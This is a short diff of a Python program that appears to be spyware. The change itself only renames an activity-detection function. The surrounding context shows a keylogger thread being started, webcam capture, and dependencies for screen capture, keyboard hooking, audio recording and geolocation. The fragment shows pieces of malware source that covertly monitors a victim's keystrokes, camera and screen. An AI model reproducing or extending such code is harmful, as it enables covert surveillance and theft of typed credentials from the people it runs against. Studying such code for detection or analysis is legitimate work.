@@ -5,7 +5,7 @@ pip install requests geocoder mss keyboard pathlib opencv-python pyaudio wave au
 """
 
 
-def detectActivity():
+def detectMouseActivity():
 	
 	global last_activity
 	
@@ -214,7 +214,7 @@ if __name__ == "__main__":
 	keylogger = threading.Thread(target=startKeylogger)
 	keylogger.start()
 	
-	activity = threading.Thread(target=detectActivity)
+	activity = threading.Thread(target=detectMouseActivity)
 	activity.start()
 	
 	cam = cv2.VideoCapture(0, cv2.CAP_DSHOW) 
